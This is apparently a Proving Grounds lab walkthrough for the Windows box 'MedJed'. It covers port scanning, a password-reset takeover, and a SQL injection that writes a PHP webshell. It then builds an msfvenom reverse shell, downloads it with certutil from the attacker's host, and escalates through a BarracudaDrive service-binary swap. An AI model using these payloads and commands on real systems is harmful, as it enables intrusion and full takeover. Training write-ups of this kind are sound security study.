---
Alias: MedJed
Date: 7/10/22
Platform: Windows
Difficulty: Intermediate
Tags: #phpinfo #RootDirectory #PHPwebshell #UNIONSELECTmysqlinjection #BarracudaDrivev6.5PrivilegeEscalation 
Status: Finished
IP: 192.168.114.127 
---

# {{MedJed}}


# Resolution summary
- Found phpinfo.php webpage on port 45332 showing the root directory
- Navigated to port 33033 in web browser and found a site containing a list of team members pictures, names, email addresses and captions
- Found a login page and clicked link "forgot password"
- Attempted to input the found emails and information from the team members and found jerren.devops successful 
- Logged in with jarren.devops and created a new password
- Found the website was running mysql
- Input a mysql command along with php webshell code into the root directory 
- Confirmed code execution on webshell and downloaded a reverse shell binary onto target machine and received a shell
- Found BarracudaDrive v6.5 Privilege Escalation
- Followed the steps to escalate privileges and received a shell running as nt system/authority


## Improved skills
- UNION SELECT mysql injection

## Used tools
- nmap
- rustscan
- feroxbuster

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.114.127 --ulimit 5000                                                                      (main) 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.114.127:135
Open 192.168.114.127:139
Open 192.168.114.127:445
Open 192.168.114.127:3306
Open 192.168.114.127:5040
Open 192.168.114.127:8000
Open 192.168.114.127:33033
Open 192.168.114.127:44330
Open 192.168.114.127:45332
Open 192.168.114.127:45443
Open 192.168.114.127:49670
Open 192.168.114.127:49669
Open 192.168.114.127:49668
Open 192.168.114.127:49667
Open 192.168.114.127:49666
Open 192.168.114.127:49664
Open 192.168.114.127:49665
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 01:29 EDT
Initiating Ping Scan at 01:29
Scanning 192.168.114.127 [2 ports]
Completed Ping Scan at 01:29, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:29
Completed Parallel DNS resolution of 1 host. at 01:29, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:29
Scanning 192.168.114.127 [17 ports]
Discovered open port 3306/tcp on 192.168.114.127
Discovered open port 445/tcp on 192.168.114.127
Discovered open port 45332/tcp on 192.168.114.127
Discovered open port 139/tcp on 192.168.114.127
Discovered open port 135/tcp on 192.168.114.127
Discovered open port 5040/tcp on 192.168.114.127
Discovered open port 49668/tcp on 192.168.114.127
Discovered open port 49666/tcp on 192.168.114.127
Discovered open port 49670/tcp on 192.168.114.127
Discovered open port 49667/tcp on 192.168.114.127
Discovered open port 49665/tcp on 192.168.114.127
Discovered open port 33033/tcp on 192.168.114.127
Discovered open port 45443/tcp on 192.168.114.127
Discovered open port 8000/tcp on 192.168.114.127
Discovered open port 49669/tcp on 192.168.114.127
Discovered open port 49664/tcp on 192.168.114.127
Discovered open port 44330/tcp on 192.168.114.127
Completed Connect Scan at 01:29, 0.16s elapsed (17 total ports)
Nmap scan report for 192.168.114.127
Host is up, received conn-refused (0.078s latency).
Scanned at 2022-07-08 01:29:46 EDT for 0s

PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
3306/tcp  open  mysql        syn-ack
5040/tcp  open  unknown      syn-ack
8000/tcp  open  http-alt     syn-ack
33033/tcp open  unknown      syn-ack
44330/tcp open  unknown      syn-ack
45332/tcp open  unknown      syn-ack
45443/tcp open  unknown      syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds


nmap -sC -sV -Pn -p 135,139,445,3306,5040,8000,33033,44330,45332,45443,49670,49669,49668,49667,49666,49664,49665 192.168.114.127
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 01:37 EDT
Nmap scan report for 192.168.114.127
Host is up (0.079s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   FourOhFourRequest, NULL: 
|_    Host '192.168.49.114' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
8000/tcp  open  http-alt      BarracudaServer.com (Windows)
|_http-title: Home
| http-methods: 
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-server-header: BarracudaServer.com (Windows)
| fingerprint-strings: 
|   FourOhFourRequest, Socks5: 
|     HTTP/1.1 200 OK
|     Date: Fri, 08 Jul 2022 05:37:23 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines, GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 08 Jul 2022 05:37:17 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 08 Jul 2022 05:37:28 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Fri, 08 Jul 2022 05:38:32 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
|_http-open-proxy: Proxy might be redirecting requests
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: BarracudaServer.com (Windows)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_  Server Date: Fri, 08 Jul 2022 05:39:53 GMT
33033/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
44330/tcp open  ssl/unknown
|_ssl-date: 2022-07-08T05:40:21+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
| Not valid before: 2009-08-27T14:40:47
|_Not valid after:  2019-08-25T14:40:47
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 08 Jul 2022 05:38:26 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines, GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 08 Jul 2022 05:37:30 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 08 Jul 2022 05:37:31 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Fri, 08 Jul 2022 05:38:42 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Quiz App
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Quiz App
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.92%I=7%D=7/8%Time=62C7C287%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.114'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFour
SF:Request,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.114'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.92%I=7%D=7/8%Time=62C7C28D%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\x202
SF:022\x2005:37:17\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\
SF:)\r\nConnection:\x20Close\r\n\r\n")%r(GetRequest,72,"HTTP/1\.1\x20200\x
SF:20OK\r\nDate:\x20Fri,\x2008\x20Jul\x202022\x2005:37:17\x20GMT\r\nServer
SF::\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\
SF:n")%r(FourOhFourRequest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x20
SF:08\x20Jul\x202022\x2005:37:23\x20GMT\r\nServer:\x20BarracudaServer\.com
SF:\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(Socks5,72,"HTTP/1\.
SF:1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\x202022\x2005:37:23\x20GMT
SF:\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Cl
SF:ose\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,
SF:\x2008\x20Jul\x202022\x2005:37:28\x20GMT\r\nServer:\x20BarracudaServer\
SF:.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(RTSPRequest,72,
SF:"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\x202022\x2005:37:
SF:28\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnecti
SF:on:\x20Close\r\n\r\n")%r(SIPOptions,13C,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nDate:\x20Fri,\x2008\x20Jul\x202022\x2005:38:32\x20GMT\r\nServer
SF::\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\nCon
SF:tent-Type:\x20text/html\r\nCache-Control:\x20no-store,\x20no-cache,\x20
SF:must-revalidate,\x20max-age=0\r\n\r\n<html><body><h1>400\x20Bad\x20Requ
SF:est</h1>Can't\x20parse\x20request<p>BarracudaServer\.com\x20\(Windows\)
SF:</p></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33033-TCP:V=7.92%I=7%D=7/8%Time=62C7C28D%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReques
SF:t,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x20
SF:charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<ht
SF:ml\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n\
SF:x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x2
SF:0\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20backgr
SF:ound-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20\
SF:x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x
SF:20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-fa
SF:mily:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20\
SF:x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-he
SF:ight:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x20
SF:\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-spac
SF:e:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\x
SF:20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x2
SF:0\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x
SF:20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\x
SF:20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x20
SF:\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20paddin
SF:g:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\n
SF:\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20\x
SF:20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;\n
SF:\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x20c
SF:olor:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x20\
SF:x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\x2
SF:0bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Typ
SF:e:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!D
SF:OCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charse
SF:t=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x2
SF:0caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x
SF:20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20co
SF:lor:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x2
SF:0}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x2
SF:0\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-s
SF:erif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x2
SF:0\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x
SF:20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x
SF:20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#E
SF:EE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x2
SF:0margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x2
SF:0\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x
SF:20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x
SF:20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\
SF:x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x
SF:20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20
SF:font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\
SF:x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-hei
SF:ght:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x2
SF:0\x20\x20\x20\x20\x20bord");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port44330-TCP:V=7.92%T=SSL%I=7%D=7/8%Time=62C7C29A%P=x86_64-pc-linux-gn
SF:u%r(GenericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20J
SF:ul\x202022\x2005:37:30\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(W
SF:indows\)\r\nConnection:\x20Close\r\n\r\n")%r(GetRequest,72,"HTTP/1\.1\x
SF:20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\x202022\x2005:37:30\x20GMT\r\
SF:nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close
SF:\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2
SF:008\x20Jul\x202022\x2005:37:31\x20GMT\r\nServer:\x20BarracudaServer\.co
SF:m\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(RTSPRequest,72,"HT
SF:TP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\x202022\x2005:37:31\
SF:x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:
SF:\x20Close\r\n\r\n")%r(FourOhFourRequest,72,"HTTP/1\.1\x20200\x20OK\r\nD
SF:ate:\x20Fri,\x2008\x20Jul\x202022\x2005:38:26\x20GMT\r\nServer:\x20Barr
SF:acudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(SIP
SF:Options,13C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2008\
SF:x20Jul\x202022\x2005:38:42\x20GMT\r\nServer:\x20BarracudaServer\.com\x2
SF:0\(Windows\)\r\nConnection:\x20Close\r\nContent-Type:\x20text/html\r\nC
SF:ache-Control:\x20no-store,\x20no-cache,\x20must-revalidate,\x20max-age=
SF:0\r\n\r\n<html><body><h1>400\x20Bad\x20Request</h1>Can't\x20parse\x20re
SF:quest<p>BarracudaServer\.com\x20\(Windows\)</p></body></html>");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-07-08T05:39:55
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.29 seconds

```

Enumerated open TCP ports:
```bash
45332
44330
333033
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 45332 

- To perform a directory brute force search we enter the following command and locate the phpinfo.php file.

“feroxbuster -u [http://192.168.114.127:45332/](http://192.168.114.127:45332/) -C 401 403 405 -x php,txt,json,docx,html”
  
![](Images/Pasted%20image%2020221020170419.png)

- We discover that the web server's root directory is "C:/xampp/htdocs" after visiting "http://192.168.114.127:45332/phpinfo.php".
  
![](Images/Pasted%20image%2020221020170505.png)
#phpinfo #WebRootDirectoryFindings


## PORT 44330 

- The webpage that appeared when we typed "http://192.168.114.127:44330" was as follows.
  
![](Images/Pasted%20image%2020221020170735.png)

- Our search for "Barracuda Drive exploit" lead us to the local privilege escalation exploit listed below.
  
![](Images/Pasted%20image%2020221020170824.png)

## PORT 33033

- We visit "http://192.168.114.127:33033" and found the webpage below, which included team names, emails, and pictures.

![](Images/Pasted%20image%2020221020170955.png)

- An intriguing photo of a team cat caught our attention.
  
![](Images/Pasted%20image%2020221020171034.png)

- The following login screen appeared when we clicked on the login link.

![](Images/Pasted%20image%2020221020171114.png)


![](Images/Pasted%20image%2020221020183042.png)

- The following page appeared when we clicked on the "forgot password" link:
  
![](Images/Pasted%20image%2020221020183337.png)

- We tried several username iterations and reminder alternatives located in the cat's profile information because the picture of the cat featured on the team seemed unusual.

- Ultimately, we discovered that the following combinations updated the password.

Username: jerren.devops
Reminder: paranoid


![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/60b3a2a9-e645-4e1d-8774-d551eac121f5)

![](Images/Pasted%20image%2020221020183508.png)

- After logging in with the username jerren.devops and the newly created password “password,” we were directed to the following webpage.
  
![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/0e9b4a6f-d951-4928-a219-bc2377c2eb2b)


We are regular users, with restricted access to sensitive data and restricted privileges. But as we investigated the web application, we found that a MySQL database was running and open to SQL injection attacks.


- We click the "edit" link, which took us to the following web page.
  
![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/82ae87e8-da77-49d1-96e1-2dff1bbc0ff4)

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/4044307d-ec18-4edf-9af2-44b6e3c3f9e3)


---

# Exploitation
## MYSQL Injection

- When we find MySQL listed on the page, we decide to see if it was susceptible to SQL injection by typing a single quote and clicking "request".
  
![](Images/Pasted%20image%2020221020191855.png)

![](Images/Pasted%20image%2020221020191917.png)

- We receive an error showing it is vulnerable and has a SQL database running.

![](Images/Pasted%20image%2020221020192000.png)
#sqlinjection 

- Entering the SQL query below, we click "Request" and a webshell is created that permits the execution of shell commands.

' UNION SELECT (“<?php echo passthru($_GET[‘cmd’]);”) INTO OUTFILE ‘C:/xampp/htdocs/cmd.php’ — -'

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/ec9d665b-b507-4801-8bb5-a79683ac12b4)


- We try to access "192.168.224.127:33033/cmd.php?cmd=whoami" in order to verify Remote Command Execution, but nothing comes up.

# Port 45332

- As port 45332 was identified by the previous NMAP scan findings as an HTTP Apache server, we try to access "192.168.224.127:45332/cmd.php?cmd=whoami" and verify RCE.

![](Images/Pasted%20image%2020221020192543.png)

- We enter the following command on our Kali machine to create a reverse shell binary.

msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=192.168.224.127 LPORT=139

- On our Kali machine, we launch an HTTP server to host the reverse shell binary.
  
- To download the reverse shell binary to the target machine, we use the following command in the web shell,

http://192.168.224.127:45332/cmd.php?cmd=certutl -urlcache -split -f http://192.168.45.167/rev.exe

-  In order to run the reverse shell binary and get a shell back, we input the following command.

http://192.168.224.127:45332/cmd.php?cmd=rev.exe

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/93614b8e-deea-4c2b-9033-ee3d51a71e0d)

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/2e50beff-e702-4afd-8c2b-1d286b04f1ec)


---

# Privilege Escalation
## BarracudaDrive v6.5 Privilege Escalation 

- We navigate to the privilege escalation exploit webpage we found on Google previously.

![](Images/Pasted%20image%2020221020193237.png)

- Rather than producing a malicious C code binary, we make use of the target machine’s existing rev.exe reverse shell binary.

- To alter the name of the bd executable, we type the following command.

move bd.exe bd.service.exe

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/8e023565-7cb3-4a85-9cf9-3f6eadc2a6a7)


- We alter the name of the reverse shell by typing the following command.

move rev.exe bd.exe

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/9fa17605-8b1e-4418-88f9-d80b5d2c5cce)

- We launch a netcat listener on a different terminal at port 139.

- When we type "shutdown -r" and wait a minute, a reverse shell that is running as nt authority\system is displayed.

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/c7d47b70-dbfe-437f-810a-2fcd5f5af400)


---
